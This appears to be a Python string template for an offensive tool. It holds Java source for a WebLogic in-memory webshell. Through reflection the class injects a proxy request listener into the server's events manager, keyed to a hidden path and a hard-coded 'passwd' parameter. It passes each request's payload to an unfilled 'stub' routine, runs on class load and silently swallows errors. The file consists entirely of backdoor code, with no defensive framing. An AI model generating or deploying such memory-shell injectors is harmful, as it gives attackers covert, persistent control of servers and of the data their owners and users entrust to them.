code = """
import java.lang.reflect.*;
import java.util.*;

public class WeblogicListener implements InvocationHandler {{
    private static String pattern = "/bea_wls_internal";
    private static String password = "passwd";
{common}
{context}
{decoder}
{stub}
    private void hook(Object servletRequestEvent) throws Exception {{
        Object servletRequest = invokeMethod(
                servletRequestEvent, "getServletRequest"
        );
        Object response = invokeMethod(servletRequest, "getResponse");
        String payload = (String) invokeMethod(
                servletRequest, "getParameter", password
        );
        stub(payload, servletRequest, response);
    }}

    @Override
    public Object invoke(Object proxy, Method method, Object[] args)
            throws Throwable {{
        if (method.getName().equals("requestInitialized")) {{
            Object servletRequestEvent = args[0];
            hook(servletRequestEvent);
        }}
        return null;
    }}

    private void addListener(Object proxyObject) throws Exception {{
        Object context = getWebAppServletContext();
        Object eventsManager = invokeMethod(context, "getEventsManager");
        List requestListeners =
                (List) getFieldValue(eventsManager, "requestListeners");
        for (Object listener: requestListeners) {{
            if (listener instanceof Proxy) {{
                return;
            }}
        }}
        requestListeners.add(0, proxyObject);
        Field hasRequestListeners =
                getField(eventsManager, "hasRequestListeners");
        hasRequestListeners.set(eventsManager, true);
    }}

    public WeblogicListener() {{
        synchronized(lock) {{
            Class servletRequestListener = null;
            try {{
                servletRequestListener = Class.forName(
                        "javax.servlet.ServletRequestListener"
                );
            }} catch (ClassNotFoundException e) {{}}

            if (servletRequestListener != null) {{
                Object proxyObject = Proxy.newProxyInstance(
                        getLoader(), new Class[]{{servletRequestListener}}, this
                );
                try {{
                    addListener(proxyObject);
                }} catch (Exception e) {{}}
            }}
        }}
    }}

    static {{
        new WeblogicListener();
    }}
}}
"""